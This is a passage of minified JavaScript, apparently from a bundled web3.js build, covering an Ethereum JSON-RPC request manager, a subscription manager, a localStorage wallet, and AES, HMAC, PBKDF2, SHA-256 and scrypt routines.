      , dI = t => t && "supportsSubscriptions"in t ? t.supportsSubscriptions() : !!(t && typeof t != "string" && "on"in t);
    var Dm = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    }, Ja;
    (function(t) {
        t.PROVIDER_CHANGED = "PROVIDER_CHANGED",
        t.BEFORE_PROVIDER_CHANGE = "BEFORE_PROVIDER_CHANGE"
    }
    )(Ja || (Ja = {}));
    const EA = {
        HttpProvider: Kd,
        WebsocketProvider: bw
    };
    class _s extends Zd {
        constructor(e, n, s) {
            super(),
            Ee(e) || this.setProvider(e),
            this.useRpcCallSpecification = n,
            Ee(s) || (this.middleware = s)
        }
        static get providers() {
            return EA
        }
        get provider() {
            return this._provider
        }
        get providers() {
            return EA
        }
        setProvider(e) {
            let n;
            if (e && typeof e == "string" && this.providers)
                if (/^http(s)?:\/\//i.test(e))
                    n = new this.providers.HttpProvider(e);
                else if (/^ws(s)?:\/\//i.test(e))
                    n = new this.providers.WebsocketProvider(e);
                else
                    throw new Iu(`Can't autodetect provider for "${e}"`);
            else
                Ee(e) ? n = void 0 : n = e;
            return this.emit(Ja.BEFORE_PROVIDER_CHANGE, this._provider),
            this._provider = n,
            this.emit(Ja.PROVIDER_CHANGED, this._provider),
            !0
        }
        setMiddleware(e) {
            this.middleware = e
        }
        send(e) {
            return Dm(this, void 0, void 0, function*() {
                const n = Object.assign({}, e);
                let s = yield this._sendRequest(n);
                if (Ee(this.middleware) || (s = yield this.middleware.processResponse(s)),
                Ur(s))
                    return s.result;
                throw new hi(s)
            })
        }
        sendBatch(e) {
            return Dm(this, void 0, void 0, function*() {
                return yield this._sendRequest(e)
            })
        }
        _sendRequest(e) {
            return Dm(this, void 0, void 0, function*() {
                const {provider: n} = this;
                if (Ee(n))
                    throw new Iu("Provider not available. Use `.setProvider` or `.provider=` to initialize the provider.");
                let s = di(e) ? c0(e) : Os(e);
                if (Ee(this.middleware) || (s = yield this.middleware.processRequest(s)),
                Aw(n)) {
                    let o;
                    try {
                        o = yield n.request(s)
                    } catch (l) {
                        o = l
                    }
                    return this._processJsonRpcResponse(s, o, {
                        legacy: !1,
                        error: !1
                    })
                }
                if (_w(n))
                    return n.request(s).then(o => this._processJsonRpcResponse(s, o, {
                        legacy: !0,
                        error: !1
                    })).catch(o => this._processJsonRpcResponse(s, o, {
                        legacy: !0,
                        error: !0
                    }));
                if (ww(n))
                    return new Promise( (o, l) => {
                        const u = h => {
                            l(this._processJsonRpcResponse(s, h, {
                                legacy: !0,
                                error: !0
                            }))
                        }
                          , d = h => o(this._processJsonRpcResponse(s, h, {
                            legacy: !0,
                            error: !1
                        }))
                          , p = n.request(s, (h, m) => h ? u(h) : d(m));
                        uw(p) && p.then(d).catch(m => {
                            try {
                                const y = this._processJsonRpcResponse(s, m, {
                                    legacy: !0,
                                    error: !0
                                });
                                l(y)
                            } catch (y) {
                                l(y)
                            }
                        }
                        )
                    }
                    );
                if (Ew(n))
                    return new Promise( (o, l) => {
                        n.send(s, (u, d) => {
                            if (u)
                                return l(this._processJsonRpcResponse(s, u, {
                                    legacy: !0,
                                    error: !0
                                }));
                            if (Ee(d))
                                throw new hi({},'Got a "nullish" response from provider.');
                            return o(this._processJsonRpcResponse(s, d, {
                                legacy: !0,
                                error: !1
                            }))
                        }
                        )
                    }
                    );
                if (xw(n))
                    return n.sendAsync(s).then(o => this._processJsonRpcResponse(s, o, {
                        legacy: !0,
                        error: !1
                    })).catch(o => this._processJsonRpcResponse(s, o, {
                        legacy: !0,
                        error: !0
                    }));
                throw new Iu("Provider does not have a request or send method to use.")
            })
        }
        _processJsonRpcResponse(e, n, {legacy: s, error: o}) {
            if (Ee(n))
                return this._buildResponse(e, null, o);
            if (jr(n)) {
                if (this.useRpcCallSpecification && o0(n)) {
                    const l = n;
                    if (en.get(l.error.code)) {
                        const u = en.get(l.error.code).error;
                        throw new u(l)
                    } else
                        throw new Rn(l)
                } else if (!_s._isReverted(n))
                    throw new Ld(n,e)
            }
            if (Ur(n))
                return n;
            if (n instanceof Error)
                throw _s._isReverted(n),
                n;
            if (!s && di(e) && Vl(n) || s && !o && di(e))
                return n;
            if (s && o && di(e))
                throw n;
            if (s && !jr(n) && !Ur(n))
                return this._buildResponse(e, n, o);
            throw di(e) && !Array.isArray(n) ? new hi(n,"Got normal response for a batch request.") : !di(e) && Array.isArray(n) ? new hi(n,"Got batch response for a normal request.") : new hi(n,"Invalid response")
        }
        static _isReverted(e) {
            let n;
            if (jr(e) ? n = e.error : e instanceof Error && (n = e),
            n?.message.includes("revert"))
                throw new As(n);
            return !1
        }
        _buildResponse(e, n, s) {
            const o = {
                jsonrpc: "2.0",
                id: di(e) ? e[0].id : "id"in e ? e.id : null
            };
            return s ? Object.assign(Object.assign({}, o), {
                error: n
            }) : Object.assign(Object.assign({}, o), {
                result: n
            })
        }
    }
    var pl = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class yd {
        constructor(e, n, s=!1) {
            this.requestManager = e,
            this.registeredSubscriptions = n,
            this.tolerateUnlinkedSubscription = s,
            this._subscriptions = new Map,
            this.requestManager.on(Ja.BEFORE_PROVIDER_CHANGE, () => pl(this, void 0, void 0, function*() {
                yield this.unsubscribe()
            })),
            this.requestManager.on(Ja.PROVIDER_CHANGED, () => {
                this.clear(),
                this.listenToProviderEvents()
            }
            ),
            this.listenToProviderEvents()
        }
        listenToProviderEvents() {
            const e = this.requestManager.provider;
            !this.requestManager.provider || typeof e?.supportsSubscriptions == "function" && !e?.supportsSubscriptions() || typeof this.requestManager.provider.on == "function" && (typeof this.requestManager.provider.request == "function" ? this.requestManager.provider.on("message", n => this.messageListener(n)) : e.on("data", n => this.messageListener(n)))
        }
        messageListener(e) {
            var n, s, o;
            if (!e)
                throw new Yi("Should not call messageListener with no data. Type was");
            const l = ((n = e.params) === null || n === void 0 ? void 0 : n.subscription) || ((s = e.data) === null || s === void 0 ? void 0 : s.subscription) || ((o = e.id) === null || o === void 0 ? void 0 : o.toString(16));
            if (l) {
                const u = this._subscriptions.get(l);
                u?.processSubscriptionData(e)
            }
        }
        subscribe(e, n) {
            return pl(this, arguments, void 0, function*(s, o, l=$t) {
                const u = this.registeredSubscriptions[s];
                if (!u)
                    throw new Yi("Invalid subscription type");
                const d = new u(o ?? void 0,{
                    subscriptionManager: this,
                    returnFormat: l
                });
                return yield this.addSubscription(d),
                d
            })
        }
        get subscriptions() {
            return this._subscriptions
        }
        addSubscription(e) {
            return pl(this, void 0, void 0, function*() {
                if (!this.requestManager.provider)
                    throw new Iu("Provider not available");
                if (!this.supportsSubscriptions())
                    throw new Yi("The current provider does not support subscriptions");
                if (e.id && this._subscriptions.has(e.id))
                    throw new Yi(`Subscription with id "${e.id}" already exists`);
                if (yield e.sendSubscriptionRequest(),
                Ee(e.id))
                    throw new Yi("Subscription is not subscribed yet.");
                return this._subscriptions.set(e.id, e),
                e.id
            })
        }
        removeSubscription(e) {
            return pl(this, void 0, void 0, function*() {
                const {id: n} = e;
                if (Ee(n))
                    throw new Yi("Subscription is not subscribed yet. Or, had already been unsubscribed but not through the Subscription Manager.");
                if (!this._subscriptions.has(n) && !this.tolerateUnlinkedSubscription)
                    throw new Yi(`Subscription with id "${n.toString()}" does not exists`);
                return yield e.sendUnsubscribeRequest(),
                this._subscriptions.delete(n),
                n
            })
        }
        unsubscribe(e) {
            return pl(this, void 0, void 0, function*() {
                const n = [];
                for (const [s,o] of this.subscriptions.entries())
                    (!e || typeof e == "function" && e({
                        id: s,
                        sub: o
                    })) && n.push(this.removeSubscription(o));
                return Promise.all(n)
            })
        }
        clear() {
            this._subscriptions.clear()
        }
        supportsSubscriptions() {
            return Ee(this.requestManager.provider) ? !1 : dI(this.requestManager.provider)
        }
    }
    var gl = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class oc extends Zd {
        constructor(e, n) {
            var s;
            super(),
            this.args = e;
            const {requestManager: o} = n
              , {subscriptionManager: l} = n;
            o ? this._subscriptionManager = new yd(o,{},!0) : this._subscriptionManager = l,
            this._returnFormat = (s = n?.returnFormat) !== null && s !== void 0 ? s : $t
        }
        get id() {
            return this._id
        }
        get lastBlock() {
            return this._lastBlock
        }
        subscribe() {
            return gl(this, void 0, void 0, function*() {
                return this._subscriptionManager.addSubscription(this)
            })
        }
        processSubscriptionData(e) {
            var n, s;
            e?.data ? this._processSubscriptionResult((s = (n = e?.data) === null || n === void 0 ? void 0 : n.result) !== null && s !== void 0 ? s : e?.data) : e && Yd(e) && this._processSubscriptionResult(e?.params.result)
        }
        sendSubscriptionRequest() {
            return gl(this, void 0, void 0, function*() {
                return this._id = yield this._subscriptionManager.requestManager.send({
                    method: "eth_subscribe",
                    params: this._buildSubscriptionParams()
                }),
                this.emit("connected", this._id),
                this._id
            })
        }
        get returnFormat() {
            return this._returnFormat
        }
        get subscriptionManager() {
            return this._subscriptionManager
        }
        resubscribe() {
            return gl(this, void 0, void 0, function*() {
                yield this.unsubscribe(),
                yield this.subscribe()
            })
        }
        unsubscribe() {
            return gl(this, void 0, void 0, function*() {
                this.id && (yield this._subscriptionManager.removeSubscription(this))
            })
        }
        sendUnsubscribeRequest() {
            return gl(this, void 0, void 0, function*() {
                yield this._subscriptionManager.requestManager.send({
                    method: "eth_unsubscribe",
                    params: [this.id]
                }),
                this._id = void 0
            })
        }
        formatSubscriptionResult(e) {
            return e
        }
        _processSubscriptionResult(e) {
            this.emit("data", this.formatSubscriptionResult(e))
        }
        _processSubscriptionError(e) {
            this.emit("error", e)
        }
        _buildSubscriptionParams() {
            throw new Error("Implement in the child class")
        }
    }
    var Ra = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class vd extends XS {
        constructor() {
            super(...arguments),
            this._addressMap = new Map,
            this._defaultKeyName = "web3js_wallet"
        }
        static getStorage() {
            let e;
            try {
                e = window.localStorage;
                const n = "__storage_test__";
                return e.setItem(n, n),
                e.removeItem(n),
                e
            } catch (n) {
                return n && (n.code === 22 || n.code === 1014 || n.name === "QuotaExceededError" || n.name === "NS_ERROR_DOM_QUOTA_REACHED") && !q(e) && e.length !== 0 ? e : void 0
            }
        }
        create(e) {
            for (let n = 0; n < e; n += 1)
                this.add(this._accountProvider.create());
            return this
        }
        add(e) {
            var n;
            if (typeof e == "string")
                return this.add(this._accountProvider.privateKeyToAccount(e));
            let s = this.length;
            return this.get(e.address) && (console.warn(`Account ${e.address.toLowerCase()} already exists.`),
            s = (n = this._addressMap.get(e.address.toLowerCase())) !== null && n !== void 0 ? n : s),
            this._addressMap.set(e.address.toLowerCase(), s),
            this[s] = e,
            this
        }
        get(e) {
            if (typeof e == "string") {
                const n = this._addressMap.get(e.toLowerCase());
                return q(n) ? void 0 : this[n]
            }
            return this[e]
        }
        remove(e) {
            if (typeof e == "string") {
                const n = this._addressMap.get(e.toLowerCase());
                return q(n) ? !1 : (this._addressMap.delete(e.toLowerCase()),
                this.splice(n, 1),
                !0)
            }
            return this[e] ? (this.splice(e, 1),
            !0) : !1
        }
        clear() {
            return this._addressMap.clear(),
            this.length = 0,
            this
        }
        encrypt(e, n) {
            return Ra(this, void 0, void 0, function*() {
                return Promise.all(this.map(s => Ra(this, void 0, void 0, function*() {
                    return s.encrypt(e, n)
                })))
            })
        }
        decrypt(e, n, s) {
            return Ra(this, void 0, void 0, function*() {
                const o = yield Promise.all(e.map(l => Ra(this, void 0, void 0, function*() {
                    return this._accountProvider.decrypt(l, n, s)
                })));
                for (const l of o)
                    this.add(l);
                return this
            })
        }
        save(e, n) {
            return Ra(this, void 0, void 0, function*() {
                const s = vd.getStorage();
                if (!s)
                    throw new Error("Local storage not available.");
                return s.setItem(n ?? this._defaultKeyName, JSON.stringify(yield this.encrypt(e))),
                !0
            })
        }
        load(e, n) {
            return Ra(this, void 0, void 0, function*() {
                const s = vd.getStorage();
                if (!s)
                    throw new Error("Local storage not available.");
                const o = s.getItem(n ?? this._defaultKeyName);
                return o && (yield this.decrypt(JSON.parse(o) || [], e)),
                this
            })
        }
    }
    const gi = {
        web: ku
    };
    function Sw(t, e, n) {
        if (!n.startsWith("aes-"))
            throw new Error(`AES submodule doesn't support mode ${n}`);
        if (e.length !== 16)
            throw new Error("AES: wrong IV length");
        if (n.startsWith("aes-128") && t.length !== 16 || n.startsWith("aes-256") && t.length !== 32)
            throw new Error("AES: wrong key length")
    }
    async function Tw(t, e, n) {
        if (!gi.web)
            throw new Error("Browser crypto not available.");
        let s;
        if (["aes-128-cbc", "aes-256-cbc"].includes(t) && (s = "cbc"),
        ["aes-128-ctr", "aes-256-ctr"].includes(t) && (s = "ctr"),
        !s)
            throw new Error("AES: unsupported mode");
        return [await gi.web.subtle.importKey("raw", e, {
            name: `AES-${s.toUpperCase()}`,
            length: e.length * 8
        }, !0, ["encrypt", "decrypt"]), {
            name: `aes-${s}`,
            iv: n,
            counter: n,
            length: 128
        }]
    }
    async function d0(t, e, n, s="aes-128-ctr", o=!0) {
        if (Sw(e, n, s),
        gi.web) {
            const [l,u] = await Tw(s, e, n)
              , d = await gi.web.subtle.encrypt(u, l, t);
            let p = new Uint8Array(d);
            return !o && u.name === "aes-cbc" && !(t.length % 16) && (p = p.slice(0, -16)),
            p
        } else if (gi.node) {
            const l = gi.node.createCipheriv(s, e, n);
            return l.setAutoPadding(o),
            nd(l.update(t), l.final())
        } else
            throw new Error("The environment doesn't have AES module")
    }
    async function fI(t, e, n, s) {
        const o = t.slice(-16);
        for (let u = 0; u < 16; u++)
            o[u] ^= n[u] ^ 16;
        return (await d0(o, e, n, s)).slice(0, 16)
    }
    async function hI(t, e, n, s="aes-128-ctr", o=!0) {
        if (Sw(e, n, s),
        gi.web) {
            const [l,u] = await Tw(s, e, n);
            if (!o && u.name === "aes-cbc") {
                const h = await fI(t, e, n, s);
                t = nd(t, h)
            }
            const d = await gi.web.subtle.decrypt(u, l, t)
              , p = new Uint8Array(d);
            if (u.name === "aes-cbc") {
                const h = await d0(p, e, n, s);
                if (!oB(h, t))
                    throw new Error("AES: wrong padding")
            }
            return p
        } else if (gi.node) {
            const l = gi.node.createDecipheriv(s, e, n);
            return l.setAutoPadding(o),
            nd(l.update(t), l.final())
        } else
            throw new Error("The environment doesn't have AES module")
    }
    class Rw extends Yp {
        constructor(e, n) {
            super(),
            this.finished = !1,
            this.destroyed = !1,
            Qp(e);
            const s = qa(n);
            if (this.iHash = e.create(),
            typeof this.iHash.update != "function")
                throw new Error("Expected instance of class which extends utils.Hash");
            this.blockLen = this.iHash.blockLen,
            this.outputLen = this.iHash.outputLen;
            const o = this.blockLen
              , l = new Uint8Array(o);
            l.set(s.length > o ? e.create().update(s).digest() : s);
            for (let u = 0; u < l.length; u++)
                l[u] ^= 54;
            this.iHash.update(l),
            this.oHash = e.create();
            for (let u = 0; u < l.length; u++)
                l[u] ^= 106;
            this.oHash.update(l),
            l.fill(0)
        }
        update(e) {
            return Ts(this),
            this.iHash.update(e),
            this
        }
        digestInto(e) {
            Ts(this),
            ao(e, this.outputLen),
            this.finished = !0,
            this.iHash.digestInto(e),
            this.oHash.update(e),
            this.oHash.digestInto(e),
            this.destroy()
        }
        digest() {
            const e = new Uint8Array(this.oHash.outputLen);
            return this.digestInto(e),
            e
        }
        _cloneInto(e) {
            e || (e = Object.create(Object.getPrototypeOf(this), {}));
            const {oHash: n, iHash: s, finished: o, destroyed: l, blockLen: u, outputLen: d} = this;
            return e = e,
            e.finished = o,
            e.destroyed = l,
            e.blockLen = u,
            e.outputLen = d,
            e.oHash = n._cloneInto(e.oHash),
            e.iHash = s._cloneInto(e.iHash),
            e
        }
        destroy() {
            this.destroyed = !0,
            this.oHash.destroy(),
            this.iHash.destroy()
        }
    }
    const f0 = (t, e, n) => new Rw(t,e).update(n).digest();
    f0.create = (t, e) => new Rw(t,e);
    function mI(t, e, n, s) {
        Qp(t);
        const o = B1({
            dkLen: 32,
            asyncTick: 10
        }, s)
          , {c: l, dkLen: u, asyncTick: d} = o;
        if (dn(l),
        dn(u),
        dn(d),
        l < 1)
            throw new Error("PBKDF2: iterations (c) should be >= 1");
        const p = qa(e)
          , h = qa(n)
          , m = new Uint8Array(u)
          , y = f0.create(t, p)
          , w = y._cloneInto().update(h);
        return {
            c: l,
            dkLen: u,
            asyncTick: d,
            DK: m,
            PRF: y,
            PRFSalt: w
        }
    }
    function pI(t, e, n, s, o) {
        return t.destroy(),
        e.destroy(),
        s && s.destroy(),
        o.fill(0),
        n
    }
    function h0(t, e, n, s) {
        const {c: o, dkLen: l, DK: u, PRF: d, PRFSalt: p} = mI(t, e, n, s);
        let h;
        const m = new Uint8Array(4)
          , y = Nu(m)
          , w = new Uint8Array(d.outputLen);
        for (let E = 1, S = 0; S < l; E++,
        S += d.outputLen) {
            const _ = u.subarray(S, S + d.outputLen);
            y.setInt32(0, E, !1),
            (h = p._cloneInto(h)).update(m).digestInto(w),
            _.set(w.subarray(0, _.length));
            for (let x = 1; x < o; x++) {
                d._cloneInto(h).update(w).digestInto(w);
                for (let b = 0; b < _.length; b++)
                    _[b] ^= w[b]
            }
        }
        return pI(d, p, u, h, w)
    }
    function gI(t, e, n, s) {
        if (typeof t.setBigUint64 == "function")
            return t.setBigUint64(e, n, s);
        const o = BigInt(32)
          , l = BigInt(4294967295)
          , u = Number(n >> o & l)
          , d = Number(n & l)
          , p = s ? 4 : 0
          , h = s ? 0 : 4;
        t.setUint32(e + p, u, s),
        t.setUint32(e + h, d, s)
    }
    const yI = (t, e, n) => t & e ^ ~t & n
      , vI = (t, e, n) => t & e ^ t & n ^ e & n;
    class bI extends Yp {
        constructor(e, n, s, o) {
            super(),
            this.blockLen = e,
            this.outputLen = n,
            this.padOffset = s,
            this.isLE = o,
            this.finished = !1,
            this.length = 0,
            this.pos = 0,
            this.destroyed = !1,
            this.buffer = new Uint8Array(e),
            this.view = Nu(this.buffer)
        }
        update(e) {
            Ts(this);
            const {view: n, buffer: s, blockLen: o} = this;
            e = qa(e);
            const l = e.length;
            for (let u = 0; u < l; ) {
                const d = Math.min(o - this.pos, l - u);
                if (d === o) {
                    const p = Nu(e);
                    for (; o <= l - u; u += o)
                        this.process(p, u);
                    continue
                }
                s.set(e.subarray(u, u + d), this.pos),
                this.pos += d,
                u += d,
                this.pos === o && (this.process(n, 0),
                this.pos = 0)
            }
            return this.length += e.length,
            this.roundClean(),
            this
        }
        digestInto(e) {
            Ts(this),
            Vp(e, this),
            this.finished = !0;
            const {buffer: n, view: s, blockLen: o, isLE: l} = this;
            let {pos: u} = this;
            n[u++] = 128,
            this.buffer.subarray(u).fill(0),
            this.padOffset > o - u && (this.process(s, 0),
            u = 0);
            for (let y = u; y < o; y++)
                n[y] = 0;
            gI(s, o - 8, BigInt(this.length * 8), l),
            this.process(s, 0);
            const d = Nu(e)
              , p = this.outputLen;
            if (p % 4)
                throw new Error("_sha2: outputLen should be aligned to 32bit");
            const h = p / 4
              , m = this.get();
            if (h > m.length)
                throw new Error("_sha2: outputLen bigger than state");
            for (let y = 0; y < h; y++)
                d.setUint32(4 * y, m[y], l)
        }
        digest() {
            const {buffer: e, outputLen: n} = this;
            this.digestInto(e);
            const s = e.slice(0, n);
            return this.destroy(),
            s
        }
        _cloneInto(e) {
            e || (e = new this.constructor),
            e.set(...this.get());
            const {blockLen: n, buffer: s, length: o, finished: l, destroyed: u, pos: d} = this;
            return e.length = o,
            e.pos = d,
            e.finished = l,
            e.destroyed = u,
            o % n && e.buffer.set(s),
            e
        }
    }
    const AI = new Uint32Array([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298])
      , Nr = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225])
      , Mr = new Uint32Array(64);
    class wI extends bI {
        constructor() {
            super(64, 32, 8, !1),
            this.A = Nr[0] | 0,
            this.B = Nr[1] | 0,
            this.C = Nr[2] | 0,
            this.D = Nr[3] | 0,
            this.E = Nr[4] | 0,
            this.F = Nr[5] | 0,
            this.G = Nr[6] | 0,
            this.H = Nr[7] | 0
        }
        get() {
            const {A: e, B: n, C: s, D: o, E: l, F: u, G: d, H: p} = this;
            return [e, n, s, o, l, u, d, p]
        }
        set(e, n, s, o, l, u, d, p) {
            this.A = e | 0,
            this.B = n | 0,
            this.C = s | 0,
            this.D = o | 0,
            this.E = l | 0,
            this.F = u | 0,
            this.G = d | 0,
            this.H = p | 0
        }
        process(e, n) {
            for (let y = 0; y < 16; y++,
            n += 4)
                Mr[y] = e.getUint32(n, !1);
            for (let y = 16; y < 64; y++) {
                const w = Mr[y - 15]
                  , E = Mr[y - 2]
                  , S = ui(w, 7) ^ ui(w, 18) ^ w >>> 3
                  , _ = ui(E, 17) ^ ui(E, 19) ^ E >>> 10;
                Mr[y] = _ + Mr[y - 7] + S + Mr[y - 16] | 0
            }
            let {A: s, B: o, C: l, D: u, E: d, F: p, G: h, H: m} = this;
            for (let y = 0; y < 64; y++) {
                const w = ui(d, 6) ^ ui(d, 11) ^ ui(d, 25)
                  , E = m + w + yI(d, p, h) + AI[y] + Mr[y] | 0
                  , _ = (ui(s, 2) ^ ui(s, 13) ^ ui(s, 22)) + vI(s, o, l) | 0;
                m = h,
                h = p,
                p = d,
                d = u + E | 0,
                u = l,
                l = o,
                o = s,
                s = E + _ | 0
            }
            s = s + this.A | 0,
            o = o + this.B | 0,
            l = l + this.C | 0,
            u = u + this.D | 0,
            d = d + this.E | 0,
            p = p + this.F | 0,
            h = h + this.G | 0,
            m = m + this.H | 0,
            this.set(s, o, l, u, d, p, h, m)
        }
        roundClean() {
            Mr.fill(0)
        }
        destroy() {
            this.set(0, 0, 0, 0, 0, 0, 0, 0),
            this.buffer.fill(0)
        }
    }
    const Xd = C1( () => new wI);
    function Bw(t, e, n, s, o) {
        if (!["sha256", "sha512"].includes(o))
            throw new Error("Only sha256 and sha512 are supported");
        return id(t),
        id(e),
        h0(Xd, t, e, {
            c: n,
            dkLen: s
        })
    }
    function xA(t, e, n, s, o, l) {
        let u = t[e++] ^ n[s++]
          , d = t[e++] ^ n[s++]
          , p = t[e++] ^ n[s++]
          , h = t[e++] ^ n[s++]
          , m = t[e++] ^ n[s++]
          , y = t[e++] ^ n[s++]
          , w = t[e++] ^ n[s++]
          , E = t[e++] ^ n[s++]
          , S = t[e++] ^ n[s++]
          , _ = t[e++] ^ n[s++]
          , x = t[e++] ^ n[s++]
          , b = t[e++] ^ n[s++]
          , I = t[e++] ^ n[s++]
          , O = t[e++] ^ n[s++]
          , z = t[e++] ^ n[s++]
          , L = t[e++] ^ n[s++]
          , Y = u
          , W = d
          , D = p
          , se = h
          , Z = m
          , oe = y
          , le = w
          , ve = E
          , ze = S
          , B = _
          , T = x
          , P = b
          , J = I
          , ie = O
          , R = z
          , F = L;
        for (let ne = 0; ne < 8; ne += 2)
            Z ^= Ye(Y + J | 0, 7),
            ze ^= Ye(Z + Y | 0, 9),
            J ^= Ye(ze + Z | 0, 13),
            Y ^= Ye(J + ze | 0, 18),
            B ^= Ye(oe + W | 0, 7),
            ie ^= Ye(B + oe | 0, 9),
            W ^= Ye(ie + B | 0, 13),
            oe ^= Ye(W + ie | 0, 18),
            R ^= Ye(T + le | 0, 7),
            D ^= Ye(R + T | 0, 9),
            le ^= Ye(D + R | 0, 13),
            T ^= Ye(le + D | 0, 18),
            se ^= Ye(F + P | 0, 7),
            ve ^= Ye(se + F | 0, 9),
            P ^= Ye(ve + se | 0, 13),
            F ^= Ye(P + ve | 0, 18),
            W ^= Ye(Y + se | 0, 7),
            D ^= Ye(W + Y | 0, 9),
            se ^= Ye(D + W | 0, 13),
            Y ^= Ye(se + D | 0, 18),
            le ^= Ye(oe + Z | 0, 7),
            ve ^= Ye(le + oe | 0, 9),
            Z ^= Ye(ve + le | 0, 13),
            oe ^= Ye(Z + ve | 0, 18),
            P ^= Ye(T + B | 0, 7),
            ze ^= Ye(P + T | 0, 9),
            B ^= Ye(ze + P | 0, 13),
            T ^= Ye(B + ze | 0, 18),
            J ^= Ye(F + R | 0, 7),
            ie ^= Ye(J + F | 0, 9),
            R ^= Ye(ie + J | 0, 13),
            F ^= Ye(R + ie | 0, 18);
        o[l++] = u + Y | 0,
        o[l++] = d + W | 0,
        o[l++] = p + D | 0,
        o[l++] = h + se | 0,
        o[l++] = m + Z | 0,
        o[l++] = y + oe | 0,
        o[l++] = w + le | 0,
        o[l++] = E + ve | 0,
        o[l++] = S + ze | 0,
        o[l++] = _ + B | 0,
        o[l++] = x + T | 0,
        o[l++] = b + P | 0,
        o[l++] = I + J | 0,
        o[l++] = O + ie | 0,
        o[l++] = z + R | 0,
        o[l++] = L + F | 0
    }
    function Lm(t, e, n, s, o) {
        let l = s + 0
          , u = s + 16 * o;
        for (let d = 0; d < 16; d++)
            n[u + d] = t[e + (2 * o - 1) * 16 + d];
        for (let d = 0; d < o; d++,
        l += 16,
        e += 16)
            xA(n, u, t, e, n, l),
            d > 0 && (u += 16),
            xA(n, l, t, e += 16, n, u)
    }
    function _I(t, e, n) {
        const s = B1({
            dkLen: 32,
            asyncTick: 10,
            maxmem: 1073742848
        }, n)
          , {N: o, r: l, p: u, dkLen: d, asyncTick: p, maxmem: h, onProgress: m} = s;
        if (dn(o),
        dn(l),
        dn(u),
        dn(d),
        dn(p),
        dn(h),
        m !== void 0 && typeof m != "function")
            throw new Error("progressCb should be function");
        const y = 128 * l
          , w = y / 4;
        if (o <= 1 || (o & o - 1) !== 0 || o >= 2 ** (y / 8) || o > 2 ** 32)
            throw new Error("Scrypt: N must be larger than 1, a power of 2, less than 2^(128 * r / 8) and less than 2^32");
        if (u < 0 || u > (2 ** 32 - 1) * 32 / y)
            throw new Error("Scrypt: p must be a positive integer less than or equal to ((2^32 - 1) * 32) / (128 * r)");
        if (d < 0 || d > (2 ** 32 - 1) * 32)
            throw new Error("Scrypt: dkLen should be positive integer less than or equal to (2^32 - 1) * 32");
        const E = y * (o + u);
        if (E > h)
            throw new Error(`Scrypt: parameters too large, ${E} (128 * r * (N + p)) > ${h} (maxmem)`);
        const S = h0(Xd, t, e, {
            c: 1,
            dkLen: y * u
        })
          , _ = Ou(S)
          , x = Ou(new Uint8Array(y * o))
          , b = Ou(new Uint8Array(y));
        let I = () => {}
        ;
        if (m) {
            const O = 2 * o * u
              , z = Math.max(Math.floor(O / 1e4), 1);
            let L = 0;
            I = () => {
                L++,
                m && (!(L % z) || L === O) && m(L / O)
            }
        }
        return {
            N: o,
            r: l,
            p: u,
            dkLen: d,
            blockSize32: w,
            V: x,
            B32: _,
            B: S,
            tmp: b,
            blockMixCb: I,
            asyncTick: p
        }
    }
    function EI(t, e, n, s, o) {
        const l = h0(Xd, t, n, {
            c: 1,
            dkLen: e
        });
        return n.fill(0),
        s.fill(0),
        o.fill(0),
        l
    }
    function xI(t, e, n) {
        const {N: s, r: o, p: l, dkLen: u, blockSize32: d, V: p, B32: h, B: m, tmp: y, blockMixCb: w} = _I(t, e, n);
        ed || td(h);
        for (let E = 0; E < l; E++) {
            const S = d * E;
            for (let _ = 0; _ < d; _++)
                p[_] = h[S + _];
            for (let _ = 0, x = 0; _ < s - 1; _++)
                Lm(p, x, p, x += d, o),
                w();
            Lm(p, (s - 1) * d, h, S, o),
            w();
            for (let _ = 0; _ < s; _++) {
                const x = h[S + d - 16] % s;
                for (let b = 0; b < d; b++)
                    y[b] = h[S + b] ^ p[x * d + b];
                Lm(y, 0, h, S, o),
                w()
            }
        }
        return ed || td(h),
